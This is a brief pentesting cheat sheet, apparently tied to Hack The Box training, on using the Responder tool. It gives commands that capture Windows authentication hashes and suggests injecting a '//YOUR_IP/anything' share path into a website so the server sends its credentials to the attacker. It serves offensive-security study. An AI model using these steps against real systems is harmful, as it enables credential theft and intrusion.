# Responder

[![server_side_attacks](../../../../_badges/htb/server_side_attacks.svg)](https://academy.hackthebox.com/course/preview/server-side-attacks)
[![attacking_common_services](../../../../_badges/htb/attacking_common_services.svg)](https://academy.hackthebox.com/course/preview/attacking-common-services)
[![active_directory_enumeration_attacks](../../../../_badges/htb/active_directory_enumeration_attacks.svg)](https://academy.hackthebox.com/course/preview/active-directory-enumeration--attacks)
[![return](../../../../_badges/htb-p/return.svg)](https://app.hackthebox.com/machines/Return)

<div class="row row-cols-lg-2"><div>

You can use [responder](https://github.com/lgandx/Responder) <small>(5.0k ⭐)</small> to catch Windows authentication requests allowing us to grab hashes and passwords.

For instance, a website may be using SMB to access some shares based on the user input. If we inject a share leading to our machine, we may be able to grab the credentials used to connect to the share.

```ps
$ sudo responder -I tun0
$ sudo responder -i IP -I tun0
```

Logs are stored at: `/usr/share/responder/logs`.
</div><div>

Following the previous example, if we inject `//YOUR_IP/anything`. If the website was configured to use the current user credentials to connect to the share, then you will receive them, and will have to crack them.

📚 It works with SMB, LDAP, etc.
</div></div>

<hr class="sep-both">

## 👻 To-do 👻

Stuff that I found, but never read/used yet.

<div class="row row-cols-lg-2"><div>

Passive Network Discovery

```ps
$ sudo responder -I tun0 -A
```
</div><div>
</div></div>